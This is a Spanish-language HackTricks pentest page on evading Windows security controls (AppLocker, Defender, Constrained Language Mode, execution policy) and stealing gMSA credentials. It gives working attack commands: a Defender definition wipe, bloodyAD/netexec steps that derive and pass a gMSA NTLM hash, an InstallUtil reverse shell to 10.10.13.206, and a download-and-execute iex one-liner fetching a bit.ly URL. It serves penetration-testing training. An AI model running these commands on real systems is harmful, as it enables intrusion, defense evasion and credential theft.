# Controles de seguridad de Windows

{{#include ../../banners/hacktricks-training.md}}

## Directiva de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que pueden estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno frente a malware dañino y software no aprobado que no se ajuste a las necesidades empresariales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y permite a los administradores del sistema controlar **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos de Windows Installer, DLLs, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es habitual que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a determinados directorios, **pero todo esto puede evadirse**.

### Comprobar

Comprueba qué archivos/extensiones están en la lista negra o en la lista blanca:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, lo que permite revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** útiles para hacer bypass de la política de AppLocker: si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **Writable folders** que puedes usar para **hacer bypass de esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Los binarios de [**"LOLBAS's"**](https://lolbas-project.github.io/) comúnmente **trusted** también pueden ser útiles para evadir AppLocker.
- Las reglas **mal escritas también podrían evadirse**.
- Por ejemplo, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y se permitirá.
- Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan las **otras ubicaciones de ejecutables de [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)**, como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- La **aplicación de directivas para DLL** rara vez está habilitada debido a la carga adicional que puede imponer en un sistema y a la cantidad de pruebas necesarias para garantizar que nada deje de funcionar. Por lo tanto, usar **DLLs como backdoors ayudará a evadir AppLocker**.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y evadir AppLocker. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo; las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por motivos de Single Sign-On.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de los usuarios...), la **autenticación**, los **tokens de acceso**...\
LSA será quien **compruebe** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y quien **se comunique** con el **controlador de dominio** para autenticar a un usuario del dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM y contraseñas fácilmente descifradas.

### Secretos de LSA

LSA podría guardar algunas credenciales en el disco:

- Contraseña de la cuenta de equipo de Active Directory (controlador de dominio inaccesible).
- Contraseñas de las cuentas de servicios de Windows.
- Contraseñas de tareas programadas.
- Más elementos (contraseña de aplicaciones IIS...).

### NTDS.dit

Es la base de datos de Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un Antivirus disponible en Windows 10 y Windows 11, así como en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting, como **`WinPEAS`**. Sin embargo, existen formas de **evadir estas protecciones**.

### Comprobación

Para comprobar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo, también puedes ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de archivos cifrado (EFS)

EFS protege los archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena dentro del **flujo de datos alternativo** $EFS del archivo cifrado. Cuando es necesario descifrarlo, la **clave privada** correspondiente al certificado digital del usuario se utiliza para descifrar la FEK del flujo $EFS. Puedes encontrar más detalles [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Escenarios de descifrado sin intervención del usuario** incluyen:

- Cuando los archivos o carpetas se mueven a un sistema de archivos que no es EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Los archivos cifrados enviados por la red mediante el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite un **acceso transparente** a los archivos cifrados para el propietario. Sin embargo, cambiar simplemente la contraseña del propietario e iniciar sesión no permitirá descifrarlos.

**Conclusiones clave**:

- EFS utiliza una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado emplea la clave privada del usuario para acceder a la FEK.
- El descifrado automático se produce bajo condiciones específicas, como copiar archivos a FAT32 o transmitirlos por la red.
- El propietario puede acceder a los archivos cifrados sin pasos adicionales.

### Comprobar información de EFS

Comprueba si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Comprueba **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos

### Descifrar archivos EFS

#### Siendo Authority System

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** en el host. Si ese es el caso, mediante una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). También puedes hacer `migrate` al proceso del usuario.

#### Conociendo la contraseña del usuario

Mimikatz documenta cómo importar el material del certificado/clave privada del usuario y descifrar archivos protegidos por EFS cuando se conoce la contraseña.<sup>[[6]](#references)</sup>

## Cuentas de servicio administradas por grupos (gMSA)

Microsoft desarrolló las **Group Managed Service Accounts (gMSA)** para simplificar la gestión de las cuentas de servicio en las infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales, que a menudo tienen habilitada la configuración "**Password never expire**", las gMSA ofrecen una solución más segura y fácil de administrar:

- **Gestión automática de contraseñas**: las gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente de acuerdo con la directiva del dominio o del equipo. Este proceso lo gestiona el Key Distribution Service (KDC) de Microsoft, eliminando la necesidad de actualizar las contraseñas manualmente.
- **Seguridad mejorada**: estas cuentas son inmunes a los bloqueos y no pueden utilizarse para inicios de sesión interactivos, lo que mejora su seguridad.
- **Compatibilidad con varios hosts**: las gMSA se pueden compartir entre varios hosts, lo que las hace ideales para servicios que se ejecutan en varios servidores.
- **Compatibilidad con tareas programadas**: a diferencia de las cuentas de servicio administradas, las gMSA permiten ejecutar tareas programadas.
- **Gestión simplificada de SPN**: el sistema actualiza automáticamente el Service Principal Name (SPN) cuando se producen cambios en los detalles sAMaccount o en el nombre DNS del equipo, simplificando la gestión de SPN.

Las contraseñas de las gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y los Domain Controllers (DCs) las restablecen automáticamente cada 30 días. Esta contraseña, un blob de datos cifrado conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y por los servidores en los que están instaladas las gMSA, garantizando un entorno seguro. Para acceder a esta información, se requiere una conexión protegida como LDAPS, o la conexión debe estar autenticada con 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more information in the archived original research**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

La misma investigación explica cómo un **NTLM relay attack** puede obtener una **contraseña de gMSA** cuando la principal retransmitida está autorizada a leer `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abusando del encadenamiento de ACL para leer la contraseña administrada de gMSA (GenericAll -> ReadGMSAPassword)

En muchos entornos, los usuarios con pocos privilegios pueden pivotar hacia secretos de gMSA sin comprometer el DC abusando de ACL de objetos mal configuradas:<sup>[[3]](#references)</sup>

- A un grupo que puedes controlar (por ejemplo, mediante GenericAll/GenericWrite) se le concede `ReadGMSAPassword` sobre un gMSA.
- Al añadirte a ese grupo, heredas el derecho a leer el blob `msDS-ManagedPassword` del gMSA mediante LDAP y derivar credenciales NTLM utilizables.

Flujo de trabajo habitual:

1) Descubre la ruta con BloodHound y marca tus principales de acceso como Owned. Busca relaciones como:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Añádete al grupo intermedio que controlas (ejemplo con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lee la contraseña administrada de gMSA mediante LDAP y deriva el hash NTLM. NetExec automatiza la extracción de `msDS-ManagedPassword` y la conversión a NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentícate como la gMSA usando el hash NTLM (no se necesita texto plano). Si la cuenta está en Remote Management Users, WinRM funcionará directamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- Las lecturas LDAP de `msDS-ManagedPassword` requieren sealing (por ejemplo, LDAPS/sign+seal). Las herramientas gestionan esto automáticamente.
- A los gMSA se les suelen conceder derechos locales como WinRM; valida la pertenencia a grupos (por ejemplo, Remote Management Users) para planificar el movimiento lateral.
- Si solo necesitas el blob para calcular el NTLM tú mismo, consulta la estructura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible para su descarga desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite gestionar las contraseñas del usuario local Administrator. Estas contraseñas, que son **aleatorias**, únicas y se **cambian periódicamente**, se almacenan de forma centralizada en Active Directory. El acceso a estas contraseñas está restringido mediante ACLs a los usuarios autorizados. Con los permisos suficientes, se permite leer las contraseñas de los administradores locales.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las funciones** necesarias para utilizar PowerShell eficazmente, como el bloqueo de objetos COM, permitir únicamente tipos .NET aprobados, workflows basados en XAML, clases de PowerShell y mucho más.

### **Comprobar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows, ese bypass ya no funciona, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que debas** **agregar una referencia** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y omitir el modo restringido. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

De forma predeterminada, está configurada como **restricted.** Principales formas de omitir esta directiva:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Se puede encontrar más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Interfaz del proveedor de compatibilidad de seguridad (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

SSPI selecciona un protocolo de autenticación adecuado para dos máquinas que se comunican, dando preferencia a Kerberos cuando está disponible. Estos protocolos son implementados por Security Support Providers (SSPs), que se instalan como DLL en Windows; ambos pares deben admitir el proveedor negociado.

### Principales SSP

- **Kerberos**: El preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** y **NTLMv2**: Por razones de compatibilidad
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL y TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Se utiliza para negociar el protocolo que se usará (Kerberos o NTLM, siendo Kerberos el predeterminado)
- %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que permite mostrar un **aviso de consentimiento para actividades con privilegios elevados**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Archivo de Internet)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA mediante encadenamiento de permisos a WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Evitando AppLocker y el modo de lenguaje restringido de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 formas de omitir la directiva de ejecución de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ descifrar archivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
